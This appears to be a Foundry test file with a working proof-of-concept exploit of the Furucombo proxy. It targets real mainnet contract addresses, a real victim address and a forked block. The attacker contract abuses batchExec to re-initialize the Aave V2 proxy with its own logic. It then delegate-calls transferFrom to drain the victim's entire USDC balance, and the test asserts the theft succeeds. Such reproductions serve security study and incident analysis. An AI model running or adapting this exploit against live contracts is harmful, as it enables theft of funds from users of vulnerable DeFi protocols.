// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IFurucomboProxy {
    function batchExec(
        address[] calldata tos,
        bytes32[] calldata configs,
        bytes[] calldata datas
    ) external payable;
}

interface IAaveV2Proxy {
    function initialize(
        address logic,
        bytes calldata data
    ) external payable;
}

contract FurucomboAttacker {
    IFurucomboProxy private constant FURUCOMBO = IFurucomboProxy(0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f);
    IAaveV2Proxy private constant AAVE_V2_PROXY = IAaveV2Proxy(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    function setup() external {
        _execute(abi.encodeCall(AAVE_V2_PROXY.initialize, (address(this), bytes(""))));
    }

    function attack(
        IERC20 token,
        address victim
    ) external {
        _execute(abi.encodeCall(this.attackDelegated, (token, victim, msg.sender)));
    }

    function attackDelegated(
        IERC20 token,
        address victim,
        address recipient
    ) external {
        token.transferFrom(victim, recipient, token.balanceOf(victim));
    }

    function _execute(
        bytes memory data
    ) private {
        address[] memory tos = new address[](1);
        bytes32[] memory configs = new bytes32[](1);
        bytes[] memory datas = new bytes[](1);
        tos[0] = address(AAVE_V2_PROXY);
        datas[0] = data;
        FURUCOMBO.batchExec(tos, configs, datas);
    }
}

contract FurucomboExploitTest is Test {
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address private constant VICTIM = 0x13f6f084e5fadED2276def5149E71811A7AbEb69;

    FurucomboAttacker private attacker;

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org", 11_940_499);
        attacker = new FurucomboAttacker();
    }

    function testExploit() public {
        uint256 victimBalance = USDC.balanceOf(VICTIM);
        uint256 beforeBalance = USDC.balanceOf(address(this));

        attacker.setup();
        attacker.attack(USDC, VICTIM);

        assertEq(USDC.balanceOf(VICTIM), 0);
        assertEq(USDC.balanceOf(address(this)), beforeBalance + victimBalance);
    }
}
